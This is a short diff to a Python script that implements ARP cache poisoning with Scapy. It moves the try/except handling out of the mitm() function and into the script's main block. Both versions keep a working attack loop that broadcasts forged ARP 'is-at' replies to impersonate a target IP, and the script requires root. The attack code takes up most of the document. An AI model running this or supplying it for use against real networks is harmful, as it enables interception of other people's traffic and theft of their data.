@@ -14,16 +14,11 @@ from argparse import ArgumentParser
 def mitm(interface, target, interval=10):
 	"""ARP cache poisoning attack"""
 
-	try:
-		myMAC = get_if_hwaddr(interface)
-		print("[*] Starting attack ...")
-		while 1:
-			sendp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(op="is-at", psrc=target, hwsrc=myMAC))
-			sleep(interval)
-	except IOError:
-		exit("[!] Interface doesn't exist")
-	except KeyboardInterrupt:
-		print("\n[*] Stopping attack")
+	myMAC = get_if_hwaddr(interface)
+	print("[*] Starting attack ...")
+	while 1:
+		sendp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(op="is-at", psrc=target, hwsrc=myMAC))
+		sleep(interval)
 
 if __name__ == "__main__":
 	ap = ArgumentParser(description="ARP cache poisoning implementation using Scapy")
@@ -35,4 +30,9 @@ if __name__ == "__main__":
 	if not geteuid() == 0:
 		exit("[!] You must be root")
 
-	mitm(args["interface"], args["target"], args["interval"])
+	try:
+		mitm(args["interface"], args["target"], args["interval"])
+	except IOError:
+		exit("[!] Interface doesn't exist")
+	except KeyboardInterrupt:
+		print("\n[*] Stopping attack")
